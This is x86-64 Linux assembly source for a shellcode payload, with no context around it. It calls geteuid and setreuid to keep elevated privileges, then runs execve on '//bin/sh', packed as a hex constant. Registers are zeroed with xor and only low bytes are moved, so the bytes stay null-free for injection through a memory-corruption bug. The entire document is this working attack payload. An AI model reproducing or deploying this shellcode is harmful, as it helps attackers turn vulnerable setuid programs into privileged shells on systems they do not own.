section .text

global _start

_start:

xor rax, rax
xor rdi, rdi
xor rsi, rsi

mov al, 107   ; geteuid
syscall
mov di, ax
mov si, ax

xor rax, rax

mov al, 113   ; setreuid
syscall

xor rax, rax
;xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

mov al, 59
push rsi
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp

syscall
